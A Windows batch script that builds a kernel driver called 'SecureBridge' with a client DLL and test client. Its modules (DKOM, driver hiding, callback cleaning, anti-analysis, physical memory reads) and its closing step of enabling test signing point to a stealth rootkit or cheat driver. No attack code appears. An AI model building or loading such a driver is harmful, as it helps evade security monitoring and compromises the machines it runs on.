@echo off
title Building SecureBridge Driver
color 0A

echo ========================================
echo    Building SecureBridge Kernel Driver
echo ========================================
echo.

:: Check for Visual Studio
if not exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    echo [!] Visual Studio 2022 not found!
    echo [*] Please install Visual Studio 2022 with C++ development tools.
    pause
    exit /b 1
)

:: Check for WDK
if not exist "C:\Program Files (x86)\Windows Kits\10\bin" (
    echo [!] Windows Driver Kit not found!
    echo [*] Please install WDK 10/11.
    pause
    exit /b 1
)

:: Setup environment
echo [*] Setting up build environment...
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

:: Set WDK environment
set WDKCONTENTROOT=C:\Program Files (x86)\Windows Kits\10
set WINDDK=%WDKCONTENTROOT%

:: Build driver
echo [*] Building driver...
cd ..\driver

if not exist "obj" mkdir obj

cl /nologo /O2 /GS- /MT /Fo"obj\\" /c ^
    driver_main.cpp ^
    memory_ops.cpp ^
    dkom.cpp ^
    anti_analysis.cpp ^
    communication.cpp ^
    hide_driver.cpp ^
    callback_cleaner.cpp ^
    physical_read.cpp ^
    pattern_scan.cpp ^
    offset_resolver.cpp ^
    /Zl /Gy /GL /Oi ^
    /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\km" ^
    /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\shared" ^
    /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um"

if %errorLevel% neq 0 (
    echo [!] Compilation failed!
    pause
    exit /b 1
)

echo [*] Linking driver...
link /nologo /driver /out:SecureBridge.sys ^
    obj\driver_main.obj ^
    obj\memory_ops.obj ^
    obj\dkom.obj ^
    obj\anti_analysis.obj ^
    obj\communication.obj ^
    obj\hide_driver.obj ^
    obj\callback_cleaner.obj ^
    obj\physical_read.obj ^
    obj\pattern_scan.obj ^
    obj\offset_resolver.obj ^
    /subsystem:native ^
    /entry:DriverEntry ^
    /ignore:4037 ^
    /merge:.rdata=.data ^
    /merge:.text=.data ^
    /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.22621.0\km\x64" ^
    ntoskrnl.lib hal.lib wdmsec.lib ntstrsafe.lib

if %errorLevel% neq 0 (
    echo [!] Linking failed!
    pause
    exit /b 1
)

:: Strip debug info (optional)
echo [*] Stripping debug info...
editbin /strip:relocs SecureBridge.sys 2>nul
editbin /strip:debug SecureBridge.sys 2>nul

:: Copy to output
echo [*] Copying to output directory...
copy /Y SecureBridge.sys ..\build\ >nul 2>&1

:: Build client DLL
echo [*] Building client DLL...
cd ..\client

cl /nologo /O2 /LD /Fe:SecureBridgeClient.dll ^
    SecureBridgeClient.cpp ^
    /link /DEF:client.def

if %errorLevel% equ 0 (
    copy /Y SecureBridgeClient.dll ..\build\ >nul 2>&1
    copy /Y SecureBridgeClient.lib ..\build\ >nul 2>&1
)

:: Build test client
echo [*] Building test client...
cl /nologo /O2 ..\tools\test_client.cpp /Fe:..\build\test_client.exe

cd ..\build

echo.
echo ========================================
echo    Build Complete!
echo ========================================
echo.
echo Output files in: %cd%
echo   - SecureBridge.sys (Kernel Driver)
echo   - SecureBridgeClient.dll (User Client)
echo   - test_client.exe (Test Utility)
echo.
echo Next steps:
echo   1. Enable test signing: bcdedit /set testsigning on
echo   2. Reboot
echo   3. Run load_driver.bat as Admin
echo   4. Run test_client.exe to verify
echo.

pause